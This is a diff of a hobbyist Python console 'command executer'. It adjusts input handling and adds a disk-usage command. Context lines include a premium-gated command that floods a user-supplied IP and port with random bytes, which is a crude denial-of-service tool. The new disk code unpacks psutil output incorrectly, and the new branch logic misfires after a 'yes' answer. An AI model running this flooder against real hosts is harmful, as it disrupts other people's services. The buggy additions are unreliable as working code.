@@ -19,11 +19,11 @@ print("░░░░░▀█░▀▄▀░░░░░█░██░▄░░�
 print("░░░░░▄█▄░░▀▀▀▀▀▀▀▀▄░░▀▀▀▀▀▀▀░▄▀░")
 print("░░░░█░░▄█▀█▀▀█▀▀▀▀▀▀█▀▀█▀█▀▀█░░░")
 print("░░░░▀▀▀▀░░▀▀▀░░░░░░░░▀▀▀░░▀▀░░░░")
-print("command executer vers 1.0.7 python, creator: ore")
+print("command executer vers 2.0.7 python, creator: ore")
 name = input("please enter your name: ")
 print(name + " welcome!")
 membership_status = input("are you an premium member? yes, no: ")
-if membership_status == "yes":
+if membership_status == "yes" or membership_status == "y":
   membership_code = input("enter your membership code: ")
   if membership_code == "2009114":
     print("a valid code detected.")
@@ -36,10 +36,12 @@ if membership_status == "yes":
       print("access granted.") 
   else:
     print("invalid code.")
-else:
+if membership_status == "no" or membership_status == "n":
   access_status = "denied"
   time.sleep(0.5)
-  print("understood, selecting the standard access")     
+  print("understood, selecting the standard access.") 
+else:
+  print("inavlid input, selecting the standard access by default.")   
 loop = input("do you want to loop the command executer? yes, no: ")
 if loop == "yes" or loop == "y":
  while True:
@@ -132,9 +134,39 @@ if loop == "yes" or loop == "y":
      profile.connect((targetip, targetport))
      for i in range(1, 100**1000):
       profile.send(random._urandom(10)*1000)
-      print(f"send: {i}", end='\r')  
+      print(f"send: {i}", end='\r') 
     else:
       print("you cannot use this command with that standard access.")
+  if command == "disk storage" or command == "disk" or command == "ds":
+    def get_disk_usage():
+        try:
+            total, used, free = psutil.disk_usage('/')
+            return total, used, free
+        except ValueError:
+            print("Unable to retrieve disk usage information.")
+            return None
+    
+    def get_disk_space():
+        try:
+            total, used, free = psutil.disk_usage('/')
+            return total, free
+        except ValueError:
+            print("Unable to retrieve disk space information.")
+            return None
+    
+    disk_usage = get_disk_usage()
+    if disk_usage is not None:
+        total_size, used_size, free_size = disk_usage
+        print(f"Total disk size: {total_size // (2**30)} GB")
+        print(f"Used disk space: {used_size // (2**30)} GB")
+        print(f"Free disk space: {free_size // (2**30)} GB")
+    
+    disk_space = get_disk_space()
+    if disk_space is not None:
+        total_space, free_space = disk_space
+        print(f"Total disk space: {total_space // (2**30)} GB")
+        print(f"Free disk space: {free_space // (2**30)} GB")
+
   if command == "pc proccess" or command == "proccess" or command == "proc":
     import wmi
     f = wmi.WMI()
@@ -200,7 +232,9 @@ if loop == "yes" or loop == "y":
     time.sleep(1.8)
     exit()
   else:
-    print("enter a valid command!")  
+    print("enter a valid command!")
+else:
+  print("an error occurred...")
 if loop == "no" or loop == "n":
   command = input("> ")
   if command == "calculator" or command == "cal":
